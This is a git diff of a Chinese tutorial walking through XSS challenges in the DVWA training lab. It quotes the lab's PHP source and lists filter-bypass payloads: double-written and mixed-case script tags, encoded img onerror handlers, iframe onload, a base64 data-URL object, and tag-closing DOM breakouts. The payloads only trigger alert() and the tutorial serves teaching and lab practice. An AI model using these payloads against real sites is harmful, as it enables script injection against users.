@@ -1,4 +1,5 @@
 https://blog.csdn.net/m0_56010012/article/details/123663649
+![image](https://github.com/minname1/tool/assets/153788696/3b4c6b28-0399-402b-b79f-26b5eb2243ab)
 # XSS漏洞
 跨站脚本攻击（Cross Site Scripting），为了不和层叠样式表（Cascading Style Sheets，缩写：CSS）混淆，所以架构跨站脚本攻击缩写为XSS。XSS就是攻击者在web页面插入恶意的Script代码，当用户浏览该页面时，嵌入其中的js代码会被执行，从而达到恶意攻击的目的。某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。
 
@@ -54,7 +55,7 @@ DOM的全称为Document Object Model，即文档对象模型，DOM通常用于�
 ## Medium
 题目源代码：
 
- 
+``` 
 Reflected XSS Source
 vulnerabilities/xss_r/source/medium.php
 <?php
@@ -71,26 +72,33 @@ if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 }
  
 ?>
- 
+
+```  
  
 
 代码分析：这里很明显看得出来，是对script字符进行了过滤，使用str_replace()函数将输入中的script替换成为空，于是需要我们想办法绕过过滤字符。
 
 1.双写绕过
 
+``` 
+
 <scr<script>ipt>alert(/xss/)</script>
 
+``` 
 2.大小写绕过
 
+``` 
 <ScRipt>alert(/xss/)</ScRipt>
 
+``` 
 可以弹框
+![image](https://github.com/minname1/tool/assets/153788696/e77f8eb6-32af-4639-8972-9c364847a1e0)
 
 
 
 # HIGH
 页面源代码
-
+``` 
 <?php
  
 header ("X-XSS-Protection: 0");
@@ -104,34 +112,35 @@ if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
     echo "<pre>Hello ${name}</pre>";
 }
  
-?> 
+?>
+``` 
  针对特殊符号，均有过滤，使得双写绕过以及大小写混淆绕过失效。(正则表达式中的i表示不区分大小写)。
 
 script标签失效，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。
 
 1.采用img标签转换后的XSS payload：
-
+``` 
 <img src = 1 onerror = alert(/xss/)>
-
+``` 
 其他编码形式：
-
+``` 
 <img src=1 οnerrοr=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>
 <img src=1 οnerrοr=eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41))></img>
 <imgsrc=1οnerrοr=eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029")></img>
-
+``` 
 2.使用iframe标签：
-
+``` 
 <iframe οnlοad=alert(/xss/)>
-
+``` 
 使用DATA URL进行XSS:
-
+``` 
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="></object>
-
+``` 
 其中的“PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=”就等同于“<script>alert('xss')</script>”
 
 # Vulnerability: Stored Cross Site Scripting (XSS)
 ## LOW
- 
+``` 
 Stored XSS Source
 vulnerabilities/xss_s/source/low.php
 <?php
@@ -156,7 +165,7 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 }
  
 ?>
- 
+ ``` 
  
 
  相关函数介绍：
@@ -189,7 +198,7 @@ stripslashes(string)函数删除字符串中的反斜杠。
 
 # Medium
  页面源代码
-
+``` 
 <?php
  
 if( isset( $_POST[ 'btnSign' ] ) ) {
@@ -214,7 +223,7 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 }
  
 ?> 
-
+``` 
 相关函数介绍：
 
 strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。
@@ -228,6 +237,7 @@ name框限制了输入长度，解决方式为修改maxlength的大小。
 绕过方式，类似于反射型XSS，1.双写绕过。2.大小写混淆绕过。3.使用非script标签的xss payload。
 
 # HIGH
+``` 
 <?php
  
 if( isset( $_POST[ 'btnSign' ] ) ) {
@@ -252,13 +262,14 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
 }
  
 ?> 
-
+``` 
 代码表示，虽然使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。
 
 操作类似于反射型XSS的high。
 
 # Vulnerability: DOM Based Cross Site Scripting (XSS)
 ## LOW
+``` 
 <?php
  
 # No protections, anything goes
@@ -284,15 +295,16 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
     }
 }
  
-?> 
+?>
+``` 
 从代码中可以看到，对<script>进行了过滤，并且将default的值设置为English。这里的script还设置了大小写绕过。
 
 可以使用img标签来进行绕过。这里需要把option标签进行闭合才能发出。前面的low是利用设置default的值，把值进行url解码，然后在option标签中显示。而option标签中是不允许存在img图片标签的，所有需要闭合标签后才能触发。
 
 构造payload:
-
+``` 
 </option></select><img src=1 οnerrοr=alert("1111")>
-
+``` 
 注入成功：
 
 
@@ -305,6 +317,7 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
 http://your ip/vulnerabilities/xss_d/?default=German&x=<script>alert(/xss/)</script>
 http://your ip/vulnerabilities/xss_d/?default=German#<script>alert(/xss/)</script>
 ## HIGH
+``` 
 Unknown Vulnerability Source
 vulnerabilities/xss_d/source/high.php
 <?php
@@ -327,15 +340,16 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
 }
  
 ?>
+``` 
 
 分析代码：default变量中的值，只允许French、English、German、Spanish中的一种才行，否则就会跳转结束运行。
 
 这里可以采用上一种方式然后。payload:</option></select><iframe  οnlοad=alert("1231")></option>
 
 绕过方式：
-
+``` 
 default=German&x=<script>alert(/xss/)</script>
 default=German#<script>alert(/xss/)</script>
-
+``` 
                         
 原文链接：https://blog.csdn.net/m0_56010012/article/details/123663649
